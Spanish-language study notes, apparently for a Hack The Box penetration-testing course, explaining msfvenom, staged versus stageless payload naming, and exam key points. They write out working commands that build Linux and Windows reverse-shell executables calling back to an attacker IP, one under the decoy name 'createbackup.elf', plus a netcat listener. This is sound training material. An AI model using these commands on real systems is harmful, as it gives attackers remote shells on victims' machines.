
## 1. ¿Qué es MSFvenom?

`msfvenom` permite **generar payloads independientes de Metasploit**, adaptados a diferentes sistemas operativos y arquitecturas.

Se puede utilizar para crear payloads que se entreguen mediante distintos métodos, por ejemplo:

- Archivos adjuntos de correo electrónico.
    
- Enlaces de descarga.
    
- Módulos de explotación de Metasploit.
    
- Unidades USB durante pruebas de penetración presenciales.
    

También permite aplicar codificación y cifrado, aunque **esto no garantiza evadir los antivirus**.

### Listar los payloads disponibles

```
msfvenom -l payloads
```

Los nombres de los payloads suelen indicar:

- **Sistema operativo:** `linux`, `windows`, `osx`, etc.
    
- **Arquitectura:** `x86`, `x64`, entre otras.
    
- **Tipo de payload:** `shell`, `meterpreter`, etc.
    
- **Comunicación:** `reverse_tcp`, `bind_tcp`, `reverse_http`, etc.

## 2. Payloads staged vs. stageless

### Staged (por fases)

Un payload staged envía inicialmente una pequeña fase (_stage_) que permite cargar el resto del payload a través de la red.

Ejemplo:

```
linux/x86/shell/reverse_tcp
```

Características:

- El payload se entrega en varias fases.
    
- Una primera parte prepara la ejecución del resto.
    
- Necesita comunicación de red para recibir las siguientes fases.
    
- Puede resultar menos adecuado en redes con latencia elevada o poco ancho de banda.
    
- Las fases también ocupan espacio en memoria.
    

### Stageless (sin fases)

Un payload stageless contiene el payload completo, sin necesitar una fase adicional para descargar el resto.

Ejemplo:

```
linux/zarch/meterpreter_reverse_tcp
```

Características:

- Contiene el payload completo.
    
- No necesita descargar fases adicionales.
    
- Puede ser más adecuado en redes con poco ancho de banda o latencia elevada.
    
- Puede reducir el tráfico necesario para iniciar el payload, pero **no implica que sea indetectable**.
    

### Diferencias en la nomenclatura

|Staged|Stageless|
|---|---|
|`windows/meterpreter/reverse_tcp`|`windows/meterpreter_reverse_tcp`|
|`linux/x86/shell/reverse_tcp`|`linux/x64/shell_reverse_tcp`|

**Regla práctica:** las barras `/` que separan componentes como `shell` y `reverse_tcp` suelen ayudar a identificar un payload staged. En los stageless, estos componentes aparecen agrupados, como en `shell_reverse_tcp` o `meterpreter_reverse_tcp`.

No obstante, conviene comprobar la descripción del payload, ya que la nomenclatura puede variar.

## 3. Crear un payload stageless para Linux

### Comando

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

### Desglose del comando

|Parámetro|Función|
|---|---|
|`msfvenom`|Herramienta que genera el payload.|
|`-p`|Especifica el payload que se utilizará.|
|`linux/x64/shell_reverse_tcp`|Payload stageless para Linux de 64 bits que establece una shell inversa TCP.|
|`LHOST=10.10.14.113`|IP del equipo atacante a la que se conectará el payload.|
|`LPORT=443`|Puerto del equipo atacante al que se conectará el payload.|
|`-f elf`|Especifica el formato de salida ELF.|
|`> createbackup.elf`|Redirige la salida al archivo `createbackup.elf`.|

**Importante:** `LHOST` debe ser una dirección IP alcanzable desde el objetivo. En laboratorios con VPN, normalmente se utiliza la IP de la interfaz VPN correspondiente.

### Recibir la conexión

En el equipo atacante, se puede preparar un listener de Netcat:

```
sudo nc -lvnp 443
```

Opciones:

- `-l`: modo escucha.
    
- `-v`: salida detallada.
    
- `-n`: evita resolver nombres.
    
- `-p 443`: puerto de escucha.
    

Cuando el payload se ejecuta correctamente y puede alcanzar al listener, se establece la conexión inversa.

## 4. Crear un payload stageless para Windows

### Comando

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > payload.exe
```

### Diferencias respecto a Linux

|Linux|Windows|
|---|---|
|`linux/x64/shell_reverse_tcp`|`windows/shell_reverse_tcp`|
|`-f elf`|`-f exe`|
|Formato ELF|Formato ejecutable de Windows|

El resto de los parámetros cumple la misma función.

En el ejemplo de HTB se utiliza un archivo `.exe` y se escucha la conexión con:

```
sudo nc -lvnp 443
```

Si el payload se ejecuta correctamente y el objetivo puede conectarse al atacante, se recibe una shell de Windows.

**Nota:** cambiar el nombre o la extensión de un archivo no cambia su formato real ni garantiza que un usuario lo ejecute.

## 5. Puntos clave para el examen

- **MSFvenom** permite generar payloads para distintas plataformas y formatos.
    
- `msfvenom -l payloads` lista los payloads disponibles.
    
- `-p` selecciona el payload.
    
- `LHOST` indica la IP a la que se conectará el payload.
    
- `LPORT` indica el puerto de destino de la conexión.
    
- `-f` establece el formato del archivo generado.
    
- `>` redirige la salida a un archivo.
    
- `linux/x64/shell_reverse_tcp` es un ejemplo de payload stageless para Linux.
    
- `windows/shell_reverse_tcp` es un ejemplo de payload stageless para Windows.
    
- **Staged:** descarga el payload en varias fases.
    
- **Stageless:** contiene el payload completo.
    
- Una shell inversa necesita que el equipo objetivo pueda alcanzar al listener del atacante.
    
- Generar un payload no significa que se haya ejecutado: también debe entregarse y ejecutarse en el objetivo.
    
- La codificación o el cifrado no garantizan la evasión del antivirus.
